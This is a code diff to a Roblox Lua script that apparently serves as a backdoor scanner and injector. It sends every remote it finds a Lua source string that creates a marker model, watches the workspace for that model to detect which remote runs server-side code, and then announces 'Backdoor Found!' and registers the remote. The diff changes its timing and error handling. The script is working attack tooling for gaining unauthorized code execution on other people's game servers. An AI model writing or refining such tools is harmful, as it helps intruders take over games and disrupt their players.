@@ -24,14 +24,23 @@ end
 local CD = generateRandomString(10)
 
 local function runRemote(remote, data)
-    if not remote then return end
-    if remote:IsA("RemoteEvent") then
-        pcall(function() remote:FireServer(data) end)
-    elseif remote:IsA("RemoteFunction") then
-        spawn(function()
-            pcall(function() remote:InvokeServer(data) end)
-        end)
+    if not remote then
+        return false, "no remote"
     end
+    if remote:IsA("RemoteEvent") then
+        local ok, err = pcall(function() remote:FireServer(data) end)
+        if not ok then
+            return false, tostring(err)
+        end
+        return true, "fired"
+    elseif remote:IsA("RemoteFunction") then
+        local ok, ret = pcall(function() return remote:InvokeServer(data) end)
+        if not ok then
+            return false, tostring(ret)
+        end
+        return true, ret
+    end
+    return false, "unsupported remote type"
 end
 
 local function findRemotes()
@@ -164,52 +173,69 @@ Inject.MouseButton1Click:Connect(function()
     end
 
     local startTime = tick()
+    local payload = 'local a = Instance.new("Model", workspace) a.Name = "'..CD..'"'
+    local foundModel = false
+    local perRemoteTimeout = 0.6
     for _, remote in ipairs(found) do
-        runRemote(remote, 'local a = Instance.new("Model",workspace) a.Name = "'..CD..'"')
+        if ExecuteWork then break end
+        local ok, res = runRemote(remote, payload)
+        local t0 = tick()
+        while tick() - t0 < perRemoteTimeout do
+            if workspace:FindFirstChild(CD) then
+                foundModel = true
+                backdoor = remote
+                ExecuteWork = true
+                break
+            end
+            task.wait(0.05)
+        end
+        if foundModel then
+            local elapsed = tick() - startTime
+            StarterGui:SetCore("SendNotification", {
+                Title = "Backdoor Found!",
+                Text = "The game has a backdoor. Backdoor was found in "..string.format("%.2f", elapsed).." seconds",
+                Duration = 5
+            })
+            tryRegister()
+            break
+        end
     end
 
-    local model = workspace:FindFirstChild(CD)
-    if model then
-        ExecuteWork = true
-        backdoor = found[1]
-        local elapsed = tick() - startTime
-        local elapsedText = string.format("%.2f", elapsed)
-        StarterGui:SetCore("SendNotification", {
-            Title = "Backdoor Found!",
-            Text = "The game has a backdoor. Backdoor was found in "..elapsedText.." seconds",
-            Duration = 5
-        })
-        tryRegister()
+    if foundModel then
         return
     end
 
-    local timeout = 8
-    local done = false
+    local broadcastPayloadDelay = 0.01
+    task.wait(broadcastPayloadDelay)
+    for _, remote in ipairs(found) do
+        runRemote(remote, payload)
+    end
+
+    local totalTimeout = 8
     local conn
-    conn = workspace.ChildAdded:Connect(function(child)
-        if child.Name == CD and not ExecuteWork then
-            done = true
-            if conn then conn:Disconnect() end
+    local t0 = tick()
+    conn = workspace.DescendantAdded:Connect(function(obj)
+        if obj.Name == CD and not ExecuteWork then
             ExecuteWork = true
             backdoor = found[1]
+            if conn then conn:Disconnect() end
             local elapsed = tick() - startTime
-            local elapsedText = string.format("%.2f", elapsed)
             StarterGui:SetCore("SendNotification", {
                 Title = "Backdoor Found!",
-                Text = "The game has a backdoor. Backdoor was found in "..elapsedText.." seconds",
+                Text = "The game has a backdoor. Backdoor was found in "..string.format("%.2f", elapsed).." seconds",
                 Duration = 5
             })
             tryRegister()
         end
     end)
 
-    local t0 = tick()
-    while not done and tick() - t0 < timeout do
+    while not ExecuteWork and tick() - t0 < totalTimeout do
         task.wait(0.05)
     end
 
-    if not done then
-        if conn then conn:Disconnect() end
+    if conn then conn:Disconnect() end
+
+    if not ExecuteWork then
         StarterGui:SetCore("SendNotification", {
             Title = "No Backdoor Found 😭",
             Text = "No backdoor was created by any remote.",
